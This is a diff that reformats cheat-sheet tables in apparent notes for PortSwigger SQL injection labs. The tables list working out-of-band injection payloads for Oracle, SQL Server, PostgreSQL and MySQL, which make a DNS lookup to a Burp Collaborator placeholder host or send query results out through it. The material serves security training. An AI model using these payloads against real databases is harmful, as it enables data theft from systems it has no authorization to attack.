@@ -53,13 +53,12 @@ To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup 
 > 
 
 ### Cheat Sheet
-
-| Oracle | (https://portswigger.net/web-security/xxe) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-The following technique works on fully patched Oracle installations, but requires elevated privileges:SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') |
-| --- | --- |
-| Microsoft | exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' |
-| PostgreSQL | copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' |
-| MySQL | The following techniques work on Windows only:LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' |
+| DATABASE TYPE | QUERIES |
+|---|---|
+| **Oracle** | (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:```SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual```. The following technique works on fully patched Oracle installations, but requires elevated privileges:```SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')``` |
+| **Microsoft** | ```exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'``` |
+| **PostgreSQL** | ```copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'``` |
+| **MySQL** | ```The following techniques work on Windows only:LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'``` |
 
 ---
 
@@ -193,11 +192,12 @@ To solve the lab, log in as the `administrator` user.
 
 ### Cheat sheet
 
-| Oracle | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual |
-| --- | --- |
-| Microsoft | declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') |
-| PostgreSQL | create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f(); |
-| MySQL | The following technique works on Windows only:SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' |
+| DATABASE TYPE | QUERIES |
+|---|---|
+| **Oracle** | ```SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual``` |
+| **Microsoft** | ```declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')``` |
+| **PostgreSQL** | ```create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f();``` |
+| **MySQL** | The following technique works on Windows only:```SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'``` |
 
 ---
 
